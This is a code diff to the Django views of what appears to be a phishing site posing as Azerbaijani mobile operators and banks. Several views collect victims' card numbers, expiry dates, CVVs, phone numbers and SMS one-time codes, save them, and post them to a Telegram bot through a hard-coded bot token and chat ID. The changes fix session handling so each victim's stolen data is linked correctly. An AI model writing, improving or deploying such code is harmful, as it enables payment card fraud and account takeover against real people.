@@ -15,6 +15,7 @@ import random
 from rest_framework import generics
 from .models import BannedIP
 from .serializers import BannedIPSerializer
+from django.core.exceptions import ObjectDoesNotExist
 
 from django.http import HttpResponseRedirect
 from django.urls import reverse
@@ -61,12 +62,13 @@ def azercell(request):
         client_ip = get_client_ip(request)
         contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
         contact.save()
+        print(contact.id)
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
+        request.session['contact_id'] = contact.id  # Store the contact_id in the session
         return redirect('info')
     return render(request, "pages/azercell.html")
-
 
 @ensure_csrf_cookie
 def bakcell(request):
@@ -93,35 +95,36 @@ def info(request):
         cardnumber= request.POST.get("cardnumber")
         if validate_card_number(cardnumber) == False:
             return render(request, "pages/3dsec.html")
-        else:
-            contact_id = request.session.get('contact_id')
-            contact = ContactModel.objects.get(id=contact_id)
-            mm_= request.POST.get("mm")
-            yy_= request.POST.get("yy")
-            cvv_= request.POST.get("cvv")
-            if cvv_ and (not cvv_.isdigit() or len(cvv_) < 3):
-                error_msg = "CVV must be a 3-digit number."
-                return render(request, "pages/3dsec.html")
-            elif len(cvv_) == 0:
-                error_msg = "CVV must be a 3-digit number."
-                return render(request, "pages/3dsec.html")
-            elif len(cvv_) == 1:
-                error_msg = "CVV must be a 3-digit number."
-                return render(request, "pages/3dsec.html")
-            elif len(cvv_) == 2:
-                error_msg = "CVV must be a 3-digit number."
-                return render(request, "pages/3dsec.html")
-            contact_id.cc = cardnumber
-            contact_id.mm = mm_
-            contact_id.yy = yy_
-            contact_id.cvv = cvv_
-            contact_id.bankname=""
-            contact_id.save()
-            response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact_id}\n{contact_id.ip}\n{contact_id.cc}|{contact_id.mm}|{contact_id.yy}|{contact_id.cvv}\n Operator: {contact_id.operator} \nNumber:{contact_id.phone}')
-            context = {
-                    'id':contact_id.id
-                }
-            return render(request, 'pages/master.html', {'last_contact_id': contact_id.id})
+        contact_id = request.session.get('contact_id')
+        contact = ContactModel.objects.get(id=contact_id)
+        print(contact_id)
+        print(contact.id,contact.cc)
+        mm_= request.POST.get("mm")
+        yy_= request.POST.get("yy")
+        cvv_= request.POST.get("cvv")
+        if cvv_ and (not cvv_.isdigit() or len(cvv_) < 3):
+            error_msg = "CVV must be a 3-digit number."
+            return render(request, "pages/3dsec.html")
+        elif len(cvv_) == 0:
+            error_msg = "CVV must be a 3-digit number."
+            return render(request, "pages/3dsec.html")
+        elif len(cvv_) == 1:
+            error_msg = "CVV must be a 3-digit number."
+            return render(request, "pages/3dsec.html")
+        elif len(cvv_) == 2:
+            error_msg = "CVV must be a 3-digit number."
+            return render(request, "pages/3dsec.html")
+        contact.cc = cardnumber
+        contact.mm = mm_
+        contact.yy = yy_
+        contact.cvv = cvv_
+        contact.bankname=""
+        contact.save()
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
+        context = {
+                'id':contact.id
+            }
+        return render(request, 'pages/master.html', {'last_contact_id': contact.id})
     operator = request.session.get('operator')
     phone = request.session.get('phone')
     amount = request.session.get('amount')
@@ -369,7 +372,7 @@ def dseckapital(request):
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
     context = {
-        'last_contact_id': last_contact.id,
+        'last_contact_id': contact.id,
     }
     if request.method == "POST":
         input1 = request.POST.get("input1")
@@ -391,32 +394,30 @@ def dseckapital(request):
 
 @ensure_csrf_cookie
 def leobank3d(request):
-    
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
     if request.method == "POST":
-        last_contact = ContactModel.objects.latest('created_at')
-        return render( request,'pages/error.html' )
-    last_contact = ContactModel.objects.latest('created_at')
-    
+        return render( request,'pages/error.html' )    
     context = {
-    'last_contact_id': last_contact.id,
-    'amount':last_contact.amount,
-    'cc': last_contact.cc[-4:],
+    'last_contact_id': contact.id,
+    'amount':contact.amount,
+    'cc': contact.cc[-4:],
     }
-    
-    return render( request,'pages/erro.html',context )
+    return render( request,'pages/error.html',context )
 
 
 
 @ensure_csrf_cookie
 def unibank(request):
-    last_contact = ContactModel.objects.latest('created_at')
-    number = str(last_contact.phone)
-    last_contact.bankname=""
-    last_contact.save()
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    number = str(contact.phone)
+    contact.bankname=""
+    contact.save()
     context = {
         'number': number[-4:],
-        'amount': last_contact.amount,
-        'cc': last_contact.cc[-4:],
+        'amount': contact.amount,
+        'cc': contact.cc[-4:],
     }
     
     return render( request,'pages/unibank3d.html',context )
@@ -425,31 +426,33 @@ def unibank(request):
 @ensure_csrf_cookie
 def unibank3d(request):
     sms = request.POST.get('secpass')
-    last_contact = ContactModel.objects.latest('created_at')
-    last_contact.sms=sms
-    last_contact.bankname=""
-    last_contact.save()
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    contact.sms=sms
+    contact.bankname=""
+    contact.save()
     context = {
-        'last_contact_id': last_contact.id,
+        'last_contact_id': contact.id,
     }
     if len(sms) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/unibank3d.html')
-    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
+    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nsms:{contact.sms}|number{contact.phone}')
     return render( request,'pages/loading.html',context )
 
 
 
 @ensure_csrf_cookie
 def pashabank(request):
-    last_contact = ContactModel.objects.latest('created_at')
-    number = str(last_contact.phone)
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    number = str(contact.phone)
     context = {
-        'last_contact_id': last_contact.id,
+        'last_contact_id': contact.id,
         'number': number[-4:],
-        'amount': last_contact.amount,
-        'cc': last_contact.cc[-4:],
+        'amount': contact.amount,
+        'cc': contact.cc[-4:],
     }
     return render( request,'pages/pasha.html',context )
 
@@ -462,18 +465,18 @@ def error(request):
 
 @ensure_csrf_cookie
 def pashabank3d(request):
-    last_contact = ContactModel.objects.latest('created_at')
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
     if request.method == "POST":
-        last_contact = ContactModel.objects.latest('created_at')
-        number = str(last_contact.phone)
+        number = str(contact.phone)
 
         context = {
                "last_contact.bankname":"",
               'number': number[-4:],
-              'amount': last_contact.amount,
-              'cc': last_contact.cc[-4:],
+              'amount': contact.amount,
+              'cc': contact.cc[-4:],
         }
-        last_contact.bankname=""
+        contact.bankname=""
         input1 = request.POST.get("input1")
         input2 = request.POST.get("input2")
         input3 = request.POST.get("input3")
@@ -489,17 +492,15 @@ def pashabank3d(request):
          # for example, you can display an error message to the user
          return render(request, 'pages/pasha.html',)
         concatenated = input1+input2 +input3+input4+input5+input6
-        last_contact = ContactModel.objects.latest('created_at')
-        last_contact.sms=concatenated
-        last_contact.bankname=""
-        last_contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
+        contact = ContactModel.objects.latest('created_at')
+        contact.sms=concatenated
+        contact.bankname=""
+        contact.save()
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nnumber{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html',context )
     
-    last_contact.bankname=""
+    contact.bankname=""
     return render( request,'pages/loading.html' )
-
-
 
 
 
